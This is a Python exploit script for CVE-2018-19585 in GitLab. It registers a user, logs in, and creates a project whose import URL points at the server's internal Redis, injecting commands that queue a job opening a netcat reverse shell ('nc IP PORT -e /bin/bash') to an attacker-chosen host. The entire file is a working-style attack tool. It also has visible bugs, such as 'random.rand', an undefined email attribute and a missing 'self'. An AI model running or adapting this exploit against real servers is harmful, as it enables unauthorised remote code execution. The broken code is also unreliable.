import requests
import lxml.html
from log_colors import *
import random
import json
import urllib.parse
import argparse
import time
import sys

requests.packages.urllib3.disable_warnings()

# CVE-2018-19585
class CVE2018_19585:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url, username, password, ip, port):
        self.url = "{}:5080".format(url.rstrip("/"))
        self.username, self.password = username, password
        self.rs_ip, self.rs_port = ip, port
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.name = "project_00{}".format(random.rand(1, 10000))

    # get csrf token from page
    def get_csrf_token(self, url):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        r = self.session.get(
                self.url + url,
                verify = False,
                )
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            csrf_param = tree.xpath(".//meta[contains(@name, 'csrf-param')]")[0]
            csrf_token = tree.xpath(".//meta[contains(@name, 'csrf-token')]")[0]
            self.csrf_param = csrf_param.attrib["content"]
            self.csrf_token = csrf_token.attrib["content"]
            print (LogColors.YELLOW + self.csrf_token + LogColors.ENDC)
            print (LogColors.GREEN + "successfully get csrf token..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "error get csrf token :(" + LogColors.ENDC)
        return self.csrf_param, self.csrf_token, r.text
    
    def register(self):
        print (LogColors.BLUE + "register new user..." + LogColors.ENDC)
        print (LogColors.YELLOW + self.username + ":" + self.password + LogColors.ENDC)
        self.get_csrf_token("/users")
        data = {
            'utf8' : '✓',
            'new_user[name]' : self.username,
            'new_user[username]' : self.username,
            'new_user[email]' : self.email,
            'new_user[email_confirmation]' : self.email,
            'new_user[password]' : self.password,
            self.csrf_param : self.csrf_token,
        }
        r = self.session.post(url + '/users', data = data, allow_redirects = False)
        if r.status_code == 302:
            print (LogColors.GREEN + "successfully register new user :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed register new user :(" + LogColors.ENDC)
            sys.exit()

    # login to gitlab
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        self.get_csrf_token('/users/sign_in')
        data = {
            'utf8=' : '✓',
            'user[login]' : self.username,
            'user[password]' : self.password,
            self.csrf_param : self.csrf_token,
        }
        r = self.session.post(url + '/users/sign_in', data = data, allow_redirects = False)
        if r.status_code == 302 and r.text.find("redirected") > -1:
            print (LogColors.GREEN + "successfully log in to giltab..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "error logging in :(" + LogColors.ENDC)

    # prepare payload with reverse shell
    def prepare_revshell(self, token, namespace_id):
        print (LogColors.BLUE + "create payload..." + LogColors.ENDC)
        import_url = "git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git"
        import_url = urllib.parse.quote_plus(import_url)
        rev_shell = """\nmulti
        sadd resque:gitlab:queues system_hook_push
        lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|nc {} {} -e /bin/bash\\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
        exec
        exec
        exec\n""".format(self.rs_ip, self.rs_port)
        token = urllib.parse.quote_plus(token)
        payload = f"utf8=%E2%9C%93&authenticity_token={token}&project%5Bimport_url%5D={import_url}{rev_shell}&project%5Bci_cd_only%5D=false&project%5Bname%5D={self.name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={self.name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"
        print (LogColors.YELLOW + "payload successfully created..." + LogColors.ENDC)
        return payload

    # exploitation (create new project)
    def exploit(self):
        self.register()
        self.login()
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        [_, token, page] = self.get_csrf_token('/projects/new')
        tree = lxml.html.fromstring(page)
        namespace_input = tree.xpath(".//form[contains(@class, 'new_project')]//input[contains(@id,'project_namespace_id')]")
        if namespace_input:
            namespace = namespace_input[0].attrib["value"]
        data = prepare_revshell(token, namespace)
        
        cookies = {
            'sidebar_collapsed': 'false',
            'event_filter': 'all',
            'hide_auto_devops_implicitly_enabled_banner_1': 'false',
            '_gitlab_session': self.session.cookies['_gitlab_session'],
        }

        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': self.url + '/projects',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '398',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

        r = self.session.post(self.url + '/projects', data = data,
                cookies = cookies, headers = headers, verify = False)
        if 'The change you requested was rejected' in r.text:
            print (LogColors.RED + 'exploit failed :(. exit' + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target gitlab url")
    parser.add_argument('-u','--username', required = True, help = "gitlab username")
    parser.add_argument('-p','--password', required = True, help = "gitlab password")
    parser.add_argument('-I','--ip', required = True, help = "local ip")
    parser.add_argument('-P','--port', required = True, help = "local port")
    args = vars(parser.parse_args())
    url = args['target']
    username, password = args["username"], args["password"]
    ip, port = args['ip'], args['port']
    cve = CVE2018_19585(url, username, password, ip, port)
    cve.exploit()

